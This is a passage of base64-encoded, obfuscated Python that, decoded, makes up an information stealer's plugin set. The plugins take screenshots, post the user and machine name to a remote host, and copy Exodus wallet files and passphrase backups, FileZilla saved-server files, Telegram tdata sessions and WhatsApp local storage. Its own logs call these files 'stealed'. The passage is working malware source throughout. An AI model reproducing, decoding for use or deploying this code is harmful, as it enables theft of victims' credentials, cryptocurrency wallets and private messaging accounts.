za1xyXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIGNocm9taXVtIHRhc2tzOiB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgIikjbGluZTo3NAogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvZGV0YWlscy5weScsYiJmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5pbXBvcnQgcGxhdGZvcm1cclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5mcm9tIG1zcy53aW5kb3dzIGltcG9ydCBNU1MgYXMgbXNzXHJcbmZyb20gdG9vbHMgaW1wb3J0IG1vdmVcclxuXHJcblxyXG5cclxuY2xhc3MgRGV0YWlscygpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIHRha2Vfc2NyZWVuc2hvdChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHdpdGggbXNzKCkgYXMgc2N0OlxyXG4gICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gc2N0LnNhdmUoKTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IG1vdmUoZmlsZW5hbWUsIGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBmaWxlbmFtZSkpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmRceGQxXHg4OFx4ZDBceGJlXHhkMVx4ODIge2ZpbGVuYW1lfSBceGQxXHg4MVx4ZDBceGJlXHhkMVx4ODVceGQxXHg4MFx4ZDBceGIwXHhkMFx4YmRceGQwXHhiNVx4ZDBceGJkJylcclxuIFxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYmdfdGFzayA9IGNyZWF0ZV90YXNrKHNlbGYudGFrZV9zY3JlZW5zaG90KCkpXHJcbiAgICAgICAgdXNlciA9IG9zLmdldGxvZ2luKClcclxuICAgICAgICBwYyA9IHBsYXRmb3JtLm5vZGUoKVxyXG4gICAgICAgIHRhZyA9IHNlbGYuY29uZi50YWdcclxuXHJcbiAgICAgICAgZGF0YSA9IHtcclxuICAgICAgICAgICAgJ2NsaWVudF9pZCc6IHNlbGYuY29uZi5jbGllbnRfaWQsXHJcbiAgICAgICAgICAgICd0YWcnOiB0YWcsXHJcbiAgICAgICAgICAgICd1c2VyX25hbWUnOiB1c2VyLFxyXG4gICAgICAgICAgICAncGNfbmFtZSc6IHBjXHJcbiAgICAgICAgfVxyXG4gICAgICAgIFxyXG4gICAgICAgIHVybCA9IGYne3NlbGYuY29uZi5ob3N0fS9yZWNlaXZlX2RldGFpbHMnXHJcblxyXG4gICAgICAgIHJlc3AgPSBhd2FpdCBzZWxmLmNvbmYuc2Vzc2lvbi5wb3N0KHVybCwganNvbj1kYXRhKVxyXG5cclxuICAgICAgICBhc3luYyB3aXRoIG9wZW4oam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdkZXRhaWxzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ3VzZXIgbmFtZToge3VzZXJ9XFxucGMgbmFtZToge3BjfVxcbnRhZzoge3RhZ30nKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODJceGQxXHg4MVx4ZDFceDgyXHhkMVx4ODNceGQwXHhiYSBceGQwXHhiZVx4ZDFceDgyXHhkMFx4YmZceGQxXHg4MFx4ZDBceGIwXHhkMFx4YjJceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmQnKVxyXG5cclxuICAgICAgICBhd2FpdCBiZ190YXNrIikjbGluZTo3NQogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvd2FsbGV0cy9fX2luaXRfXy5weScsYidmcm9tIC5leG9kdXMgaW1wb3J0IEV4b2R1cycpI2xpbmU6NzYKICAgIF9fT08wT08wMDBPT08wTzBPTzAgKCdwbHVnaW5zL3dhbGxldHMvZXhvZHVzLnB5JyxiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgd2Fsa1xyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZSwgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRXhvZHVzKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd3YWxsZXRzXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBsb2dfZXhvZHVzX3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZlwnZXhvZHVzX3t0b2tlbl9oZXgoNCl9XCcpXHJcblxyXG4gICAgICAgIHdhbGxldF9mb2xkZXIgPSBqb2luKHBhdGgsIFwnZXhvZHVzLndhbGxldFwnKVxyXG4gICAgICAgIGlmIGlzZGlyKHdhbGxldF9mb2xkZXIpOlxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5dHJlZSh3YWxsZXRfZm9sZGVyLCBsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBleG9kdXMgXHhkMVx4ODEge3BhdGh9XCcpXHJcblxyXG4gICAgICAgIGJhY3VrcHNfZm9sZGVyID0gam9pbihwYXRoLCBcJ2JhY2t1cHNcJylcclxuICAgICAgICBmb3IgZGlycGF0aCwgZGlybmFtZXMsIGZpbGVuYW1lcyBpbiB3YWxrKGJhY3VrcHNfZm9sZGVyKTpcclxuICAgICAgICAgICAgZm9yIGYgaW4gZmlsZW5hbWVzOlxyXG4gICAgICAgICAgICAgICAgaWYgZiA9PSAicGFzc3BocmFzZS5qc29uIjpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIobG9nX2V4b2R1c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWtkaXIobG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4oZGlycGF0aCwgZiksIGpvaW4obG9nX2V4b2R1c19wYXRoLCBmXCdwYXNzcGhyYXNlX3t0b2tlbl9oZXgoNCl9Lmpzb25cJykpJykjbGluZTo3NwogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvd2FsbGV0cy9FeG9kdXMucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCB3YWxrXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlLCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBFeG9kdXMoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3dhbGxldHNcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGxvZ19leG9kdXNfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmXCdleG9kdXNfe3Rva2VuX2hleCg0KX1cJylcclxuXHJcbiAgICAgICAgd2FsbGV0X2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdleG9kdXMud2FsbGV0XCcpXHJcbiAgICAgICAgaWYgaXNkaXIod2FsbGV0X2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHdhbGxldF9mb2xkZXIsIGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkIGV4b2R1cyBceGQxXHg4MSB7cGF0aH1cJylcclxuXHJcbiAgICAgICAgYmFjdWtwc19mb2xkZXIgPSBqb2luKHBhdGgsIFwnYmFja3Vwc1wnKVxyXG4gICAgICAgIGZvciBkaXJwYXRoLCBkaXJuYW1lcywgZmlsZW5hbWVzIGluIHdhbGsoYmFjdWtwc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBmb3IgZiBpbiBmaWxlbmFtZXM6XHJcbiAgICAgICAgICAgICAgICBpZiBmID09ICJwYXNzcGhyYXNlLmpzb24iOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihsb2dfZXhvZHVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBta2Rpcihsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihkaXJwYXRoLCBmKSwgam9pbihsb2dfZXhvZHVzX3BhdGgsIGZcJ3Bhc3NwaHJhc2Vfe3Rva2VuX2hleCg0KX0uanNvblwnKSknKSNsaW5lOjc4CiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9maWxlemlsbGEucHknLGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEZpbGV6aWxsYShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VhcmNoID0geydyZWNlbnRzZXJ2ZXJzLnhtbCcsICdzaXRlbWFuYWdlci54bWwnfVxyXG4gICAgICAgIGZpbGVzID0gc2VhcmNoLmludGVyc2VjdGlvbihpLm5hbWUgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSlcclxuXHJcbiAgICAgICAgaWYgbm90IGZpbGVzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2ZpbGV6aWxsYScpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHJlc19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgZm9yIGYgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIGZpbGVuYW1lID0gZi5zcGxpdCgnLicpWzBdXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYne2ZpbGVuYW1lfV97dG9rZW5faGV4KDQpfS54bWwnKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKHBhdGgsIGYpLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRmlsZXppbGxhIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpI2xpbmU6NzkKICAgIF9fT08wT08wMDBPT08wTzBPTzAgKCdwbHVnaW5zL3RlbGVncmFtLnB5JyxiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pbiwgbm9ybXBhdGhcclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcbmZyb20gcGF0aHMgaW1wb3J0IExPQ0FMXHJcbmltcG9ydCB3aW4zMmNvbS5jbGllbnRcclxuaW1wb3J0IHBzdXRpbFxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IHNwbGl0XHJcblxyXG5cclxuXHJcbmNsYXNzIFRlbGVncmFtKFBsdWdpbik6XHJcbiAgICBTVEVBTEVEID0gc2V0KClcclxuXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBwYXRoXyA9IG5vcm1wYXRoKHBhdGgubG93ZXIoKSlcclxuICAgICAgICBpZiBwYXRoXyBpbiBUZWxlZ3JhbS5TVEVBTEVEOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBUZWxlZ3JhbS5TVEVBTEVELmFkZChwYXRoXylcclxuICAgICAgICBcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCBcJ3RkYXRhXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGVsZWdyYW1fcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3RlbGVncmFtXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRlbGVncmFtX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih0ZWxlZ3JhbV9wYXRoKVxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4odGVsZWdyYW1fcGF0aCwgZlwndGRhdGFfe3Rva2VuX2hleCg0KX1cJylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gW1wnZHVtcHNcJywgXCdlbW9qaVwnLCBcJ3VzZXJfZGF0YVwnLCBcJ3dvcmtpbmdcJ11cclxuXHJcbiAgICAgICAgZm9yIGYgaW4gc2NhbmRpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgZmlsZV9vayA9IFRydWVcclxuICAgICAgICAgICAgZm9yIGkgaW4gYmxhY2tsaXN0OlxyXG4gICAgICAgICAgICAgICAgaWYgaSBpbiBmLm5hbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgZmlsZV9vayA9IEZhbHNlXHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGlmIG5vdCBmaWxlX29rOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGZyb21fcGF0aCA9IGpvaW4odGRhdGFfcGF0aCwgZi5uYW1lKVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmLm5hbWUpXHJcblxyXG4gICAgICAgICAgICBmdW5jID0gY29weWZpbGUgaWYgZi5pc19maWxlKCkgZWxzZSBjb3B5dHJlZVxyXG4gICAgICAgICAgICBhd2FpdCBmdW5jKGZyb21fcGF0aCwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdUZWxlZ3JhbSBzdGVhbGVkIGZyb20ge3BhdGh9XCcpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9yZWdpc3RyeV9wYXRoKCk6XHJcbiAgICAgICAgcGF0aCA9IHdpbnJlZy5IS0VZX0NMQVNTRVNfUk9PVFxyXG5cclxuICAgICAgICB0ZyA9IHdpbnJlZy5PcGVuS2V5RXgocGF0aCwgciJ0ZGVza3RvcC50Z1xcXFwiKVxyXG4gICAgICAgIHNoZWxsID0gd2lucmVnLk9wZW5LZXlFeCh0Zywgclwnc2hlbGxcXFxcXCcpXHJcbiAgICAgICAgb3Blbl9yZyA9IHdpbnJlZy5PcGVuS2V5RXgoc2hlbGwsIHJcJ29wZW5cXFxcXCcpXHJcbiAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXlFeChvcGVuX3JnLCByXCdjb21tYW5kXFxcXFwnKVxyXG5cclxuICAgICAgICB2YWx1ZSA9IHdpbnJlZy5FbnVtVmFsdWUoa2V5LCAwKVxyXG5cclxuICAgICAgICBwYXRoID0gcmUuZmluZGFsbChyXCciKFteIl0qKVwnLCB2YWx1ZVsxXSlbMl1cclxuICAgICAgICByZXR1cm4gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9sbmtfcGF0aCgpOlxyXG4gICAgICAgIGRlc2t0b3AgPSBqb2luKExPQ0FMLCBcJ2Rlc2t0b3BcJylcclxuXHJcbiAgICAgICAgZm9yIGl0IGluIHNjYW5kaXIoZGVza3RvcCk6XHJcbiAgICAgICAgICAgIGlmIGl0Lm5hbWUuc3BsaXQoXCcuXCcpWy0xXSA9PSBcJ2xua1wnIGFuZCBcJ3RlbGVncmFtXCcgaW4gaXQubmFtZS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgc2hlbGwgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldTY3JpcHQuU2hlbGwiKVxyXG4gICAgICAgICAgICAgICAgc2hvcnRjdXQgPSBzaGVsbC5DcmVhdGVTaG9ydEN1dChpdC5wYXRoKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IHNob3J0Y3V0LlRhcmdldHBhdGgubG93ZXIoKS5zdHJpcChcJ3RlbGVncmFtLmV4ZVwnKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGhcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3RlbGVncmFtcygpOlxyXG4gICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKTpcclxuICAgICAgICAgICAgaWYgXCd0ZWxlZ3JhbVwnIGluIHByb2MubmFtZSgpLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgeWllbGQgc3BsaXQocHJvYy5leGUoKSlbMF1cclxuICAgICAgICAgICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzJykjbGluZTo4MAogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvd2hhdHNhcHAucHknLGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlXHJcblxyXG5cclxuXHJcbmNsYXNzIFdoYXRzYXBwKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBmb2xkZXIgPSBqb2luKHBhdGgsICdsb2NhbCBzdG9yYWdlJywgJ2xldmVsZGInKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNkaXIoZm9sZGVyKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgXHJcbiAgICAgICAgd2hhdHNhcHBfcmVzX2ZvbGRlciA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2hhdHNhcHAnKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcik6XHJcbiAgICAgICAgICAgIG1rZGlyKHdoYXRzYXBwX3Jlc19mb2xkZXIpXHJcblxyXG4gICAgICAgIHJlcyA9IGpvaW4od2hhdHNhcHBfcmVzX2ZvbGRlciwgZid3aGF0c2FwcF97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgIGF3YWl0IGNvcHl0cmVlKGZvbGRlciwgcmVzKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1doYXRzYXBwIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpI2xpbmU6ODEKICAgIF9fT08wT08wMDBPT08wTzBPTzAgKCdwbHVnaW5zL0RldGFpbHMucHknLGIiZnJvbSBhc3luY2lvIGltcG9ydCBjcmVhdGVfdGFza1xyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmltcG9ydCBvc1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuaW1wb3J0IHBsYXRmb3JtXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuZnJvbSBtc3Mud2luZG93cyBpbXBvcnQgTVNTIGFzIG1zc1xyXG5mcm9tIHRvb2xzIGltcG9ydCBtb3ZlXHJcblxyXG5cclxuXHJcbmNsYXNzIERldGFpbHMoKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiB0YWtlX3NjcmVlbnNob3Qoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICB3aXRoIG1zcygpIGFzIHNjdDpcclxuICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIHNjdC5zYXZlKCk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBtb3ZlKGZpbGVuYW1lLCBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgZmlsZW5hbWUpKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJkXHhkMVx4ODhceGQwXHhiZVx4ZDFceDgyIHtmaWxlbmFtZX0gXHhkMVx4ODFceGQwXHhiZVx4ZDFceDg1XHhkMVx4ODBceGQwXHhiMFx4ZDBceGJkXHhkMFx4YjVceGQwXHhiZCcpXHJcbiBcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGJnX3Rhc2sgPSBjcmVhdGVfdGFzayhzZWxmLnRha2Vfc2NyZWVuc2hvdCgpKVxyXG4gICAgICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpXHJcbiAgICAgICAgcGMgPSBwbGF0Zm9ybS5ub2RlKClcclxuICAgICAgICB0YWcgPSBzZWxmLmNvbmYudGFnXHJcblxyXG4gICAgICAgIGRhdGEgPSB7XHJcbiAgICAgICAgICAgICdjbGllbnRfaWQnOiBzZWxmLmNvbmYuY2xpZW50X2lkLFxyXG4gICAgICAgICAgICAndGFnJzogdGFnLFxyXG4gICAgICAgICAgICAndXNlcl9uYW1lJzogdXNlcixcclxuICAgICAgICAgICAgJ3BjX25hbWUnOiBwY1xyXG4gICAgICAgIH1cclxuICAgICAgICBcclxuICAgICAgICB1cmwgPSBmJ3tzZWxmLmNvbmYuaG9zdH0vcmVjZWl2ZV9kZXRhaWxzJ1xyXG5cclxuICAgICAgICByZXNwID0gYXdhaXQgc2VsZi5jb25mLnNlc3Npb24ucG9zdCh1cmwsIGpzb249ZGF0YSlcclxuXHJcbiAgICAgICAgYXN5bmMgd2l0aCBvcGVuKGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZGV0YWlscy50eHQnKSwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZid1c2VyIG5hbWU6IHt1c2VyfVxcbnBjIG5hbWU6IHtwY31cXG50YWc6IHt0YWd9JylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDgyXHhkMVx4ODFceGQxXHg4Mlx4ZDFceDgzXHhkMFx4YmEgXHhkMFx4YmVceGQxXHg4Mlx4ZDBceGJmXHhkMVx4ODBceGQwXHhiMFx4ZDBceGIyXHhkMFx4YmJceGQwXHhiNVx4ZDBceGJkJylcclxuXHJcbiAgICAgICAgYXdhaXQgYmdfdGFzayIpI2xpbmU6ODIKICAgIF9fT08wT08wMDBPT08wTzBPTzAgKCdwbHVnaW5zL0ZpbGV6aWxsYS5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRmlsZXppbGxhKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWFyY2ggPSB7J3JlY2VudHNlcnZlcnMueG1sJywgJ3NpdGVtYW5hZ2VyLnhtbCd9XHJcbiAgICAgICAgZmlsZXMgPSBzZWFyY2guaW50ZXJzZWN0aW9uKG